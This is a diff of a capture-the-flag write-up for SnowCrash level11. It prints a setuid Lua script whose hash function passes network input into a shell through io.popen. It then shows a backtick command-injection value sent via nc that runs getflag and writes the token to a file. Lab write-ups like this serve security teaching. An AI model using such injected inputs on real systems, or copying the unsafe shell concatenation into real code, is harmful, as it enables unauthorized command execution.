@@ -2,62 +2,83 @@
 
 ## Analysis
 
-Same as always... Let's inspect what we have:
+## Inspection
+
+In this home directory, we have a lua script:
 ```bash
     level11@SnowCrash:~$ ls -la
-    total 16
-    dr-xr-x---+ 1 level11 level11  120 Mar  5  2016 .
-    d--x--x--x  1 root    users    340 Aug 30  2015 ..
-    -r-x------  1 level11 level11  220 Apr  3  2012 .bash_logout
-    -r-x------  1 level11 level11 3518 Aug 30  2015 .bashrc
+    [...]
     -rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua
-    -r-x------  1 level11 level11  675 Apr  3  2012 .profile
-    level11@SnowCrash:~$ file level11.lua 
+    [...]
+```
+```
+    $ file level11.lua
     level11.lua: setuid setgid a lua script, ASCII text executable
 ```
 
-If we use the command strings on the exec to check what's inside we can see:
+## investigation
+
+We use `cat` to read the content of this script:
 ```bash
-level11@SnowCrash:~$ strings level11.lua 
-#!/usr/bin/env lua
-local socket = require("socket")
-local server = assert(socket.bind("127.0.0.1", 5151))
-function hash(pass)
-  prog = io.popen("echo "..pass.." | sha1sum", "r")
-  data = prog:read("*all")
-  prog:close()
-  data = string.sub(data, 1, 40)
-  return data
-while 1 do
-  local client = server:accept()
-  client:send("Password: ")
-  client:settimeout(60)
-  local l, err = client:receive()
-  if not err then
-      print("trying " .. l)
-      local h = hash(l)
-      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
-          client:send("Erf nope..\n");
-      else
-          client:send("Gz you dumb*\n")
-      end
-  end
-  client:close()
+    $ cat level11.lua 
+    #!/usr/bin/env lua
+    local socket = require("socket")
+    local server = assert(socket.bind("127.0.0.1", 5151))
+
+    function hash(pass)
+    prog = io.popen("echo "..pass.." | sha1sum", "r")
+    data = prog:read("*all")
+    prog:close()
+
+    data = string.sub(data, 1, 40)
+
+    return data
+    end
+
+
+    while 1 do
+    local client = server:accept()
+    client:send("Password: ")
+    client:settimeout(60)
+    local l, err = client:receive()
+    if not err then
+        print("trying " .. l)
+        local h = hash(l)
+
+        if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
+            client:send("Erf nope..\n");
+        else
+            client:send("Gz you dumb*\n")
+        end
+
+    end
+
+    client:close()
+    end
 ```
 
-## Solution
-The interesting part is in the function hash(). We can see the function, the subprocess runs "echo" without
-any kind of restriction or control. 
+This programs listens to port `5151` but the important part lies in the function `hash`. The user input `pass` is directly concatenated into shell command, executed via `io.popen`. Lua script runs with setuid privileges and shell interprets metacharacters
+In short, the program constructs a shell command unsafely using string concatenation inside `io.popen`.This means it is possible to execute lua subprocess command injection via unsanitized string concatenation.
 
-If you lauch the program with nc localhost 5151, ip and port we found in the ./level11,
-the program asks for a password. No problem, we're not trying to find it but we can try 
-to run a command that would be executed by the "echo" we found earlier:
+## Exploitation
+
+Here give a command as input to the requested password:
 ```bash
     level11@SnowCrash:~$ nc localhost 5151
     Password: `getflag` > /tmp/token
+```
+Although the server returns:
+```
     Erf nope..
-    level11@SnowCrash:~$ cat /tmp/token
+```
+the injected command still executes successfully:
+```bash
+    $ cat /tmp/token
     Check flag.Here is your token : XXXXXXXXXXXXXXXXXXXXXXXXXXXX
 ```
 
+## Takeaways
 
+- Lua io.popen() executes commands via a shell, making it vulnerable when using string concatenation
+- Unsanitized user input in shell command construction leads to command injection
+- Backticks and shell operators can be evaluated before or during remote execution
